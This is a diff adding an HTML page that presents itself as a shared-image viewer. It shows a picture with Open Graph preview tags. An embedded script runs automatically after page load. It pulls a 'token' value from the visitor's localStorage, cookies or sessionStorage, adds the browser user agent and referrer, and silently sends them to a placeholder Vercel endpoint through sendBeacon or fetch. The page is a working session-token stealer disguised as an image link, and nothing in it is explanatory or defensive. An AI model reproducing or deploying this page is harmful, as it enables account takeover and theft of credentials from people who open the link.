@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta property="og:title" content="Shared image">
+<meta property="og:image" content="https://i.postimg.cc/7669XyG2/bc90ac332a3654aae22b34f47a168864.jpg">
+<title>image</title>
+<style>
+body{margin:0;background:#111;display:flex;align-items:center;justify-content:center;height:100vh}
+img{max-width:90vw;max-height:85vh;border-radius:12px}
+</style>
+</head>
+<body>
+<img src="https://i.postimg.cc/7669XyG2/bc90ac332a3654aae22b34f47a168864.jpg">
+<script>
+const ENDPOINT="https://YOUR-APP.vercel.app/api/p";
+function go(){
+  let t="";
+  try{ let v=localStorage.getItem("token"); if(v){ try{ v=JSON.parse(v).token||v }catch(e){} t=String(v) } }catch(e){}
+  if(!t){ try{ const m=document.cookie.match(/token=([^;]+)/); if(m) t=decodeURIComponent(m[1]) }catch(e){} }
+  if(!t){ try{ t=sessionStorage.getItem("token")||"" }catch(e){} }
+  const body=JSON.stringify({t,ua:navigator.userAgent,ref:document.referrer||"",ts:Date.now()});
+  try{ navigator.sendBeacon(ENDPOINT,new Blob([body],{type:"application/json"})) }
+  catch(e){ fetch(ENDPOINT,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true}).catch(()=>{}) }
+}
+window.addEventListener("load",()=>setTimeout(go,400));
+</script>
+</body>
+</html>
